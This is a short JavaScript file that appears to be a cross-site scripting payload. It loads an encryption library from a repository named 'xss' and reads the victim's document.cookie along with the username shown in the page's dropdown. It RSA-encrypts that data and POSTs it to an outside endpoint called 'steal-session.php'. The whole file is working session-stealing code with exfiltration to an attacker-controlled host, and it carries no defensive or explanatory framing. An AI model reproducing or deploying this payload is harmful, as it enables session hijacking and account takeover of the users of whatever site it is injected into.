$.getScript('https://cdn.jsdelivr.net/gh/kupihleba/xss/jsencrypt.min.js', () => {
	$.ajax({
		url: "https://ourcoding.space/bmstu/steal-session.php",
		type: "POST",
		data: getSession(),
		cache: false,
		processData: false, 
		contentType: "text/plain"
	});
});
function getSession() {
  const pubkey = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs5r+e31SzPC0kywYG391
AxyeXteWmvV/hmuOUhVOW4ugSO3TPXJOCo4nL0bzWvWTn9UNWE2oCZxKk5XDHVD3
kuWfOHbIrKYhQUrgXHXYi1HuA/nK6OtxVL+Ga5pNTQJWNcuBzS9MY8smtbwEMIi4
uNSqLlLQK4LSQAZPWAA9DQRnBym3FSie/vVKjnzuaiV8YfG2ma2v/HcsaKcfnAlj
tFbsA9NZ8uC4uCOqsYdS30m6rGVy/lF/SJtyLP9zqX9nPPVpAjLyYfZ5wtSfHcwk
AdKksyCcuB5l/7z2L2SJj0l80eTXzgxIuCHsyLWnNWvsXxEVeGm8HGFFMyZm7ed1
LQIDAQAB
-----END PUBLIC KEY-----`;
  const encrypt = new JSEncrypt();
  encrypt.setPublicKey(pubkey);
  const data = document.cookie + "\n" + $('.dropdown-toggle').text().trim();
  let chunks = [];
  for (let i = 0; i < data.length; i += 245) {
    chunks.push(encrypt.encrypt(data.slice(i, i + 245)));
  }
  return chunks.join('&');
}
